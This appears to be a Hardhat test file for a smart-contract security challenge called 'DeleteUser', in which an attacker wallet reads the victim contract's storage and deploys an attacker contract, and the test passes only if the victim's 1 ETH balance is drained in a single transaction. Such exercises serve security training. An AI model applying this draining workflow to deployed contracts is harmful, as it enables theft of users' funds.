const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "DeleteUser";

describe(NAME, function () {
  async function setup() {
    const [owner, attackerWallet] = await ethers.getSigners();

    const VictimFactory = await ethers.getContractFactory(NAME);
    const victimContract = await VictimFactory.deploy();
    await victimContract.deposit({ value: ethers.utils.parseEther("1") });

    return { victimContract, attackerWallet };
  }

  describe("exploit", async function () {
    let victimContract, attackerWallet;
    before(async function () {
      ({ victimContract, attackerWallet } = await loadFixture(setup));
    });

    it("conduct your attack here", async function () {
      // await victimContract
      //   .connect(attackerWallet)
      //   .deposit({ value: ethers.utils.parseEther("1") });
      // await victimContract
      //   .connect(attackerWallet)
      //   .deposit();
      // await victimContract
      //   .connect(attackerWallet)
      //   .withdraw(1);
      // await victimContract
      //   .connect(attackerWallet)
      //   .withdraw(1);

      index = await ethers.provider.getStorageAt(victimContract.address, 0);
      // console.log(ethers.utils.keccak256(ethers.utils.hexZeroPad(ethers.utils.hexlify(0), 32)));
      // console.log(await ethers.provider.getStorageAt(
      //   victimContract.address,
      //   "0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563"));
      // console.log(await ethers.provider.getStorageAt(
      //   victimContract.address,
      //   "0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e564"));
      // console.log(await ethers.provider.getStorageAt(
      //   victimContract.address,
      //   "0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e565"));
      // console.log(await ethers.provider.getStorageAt(
      //   victimContract.address,
      //   "0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e566"));

      const attacker = await (
        await ethers.getContractFactory("DeleteUserAttacker", attackerWallet))
        .deploy(victimContract.address, index, { value: ethers.utils.parseEther("0.1") });
      // await attacker.attack(victimContract.address, 1, { value: ethers.utils.parseEther("1") });
    });

    after(async function () {
      expect(
        await ethers.provider.getBalance(victimContract.address)
      ).to.be.equal(0);
      expect(
        await ethers.provider.getTransactionCount(attackerWallet.address)
      ).to.equal(1, "must exploit one transaction");
    });
  });
});
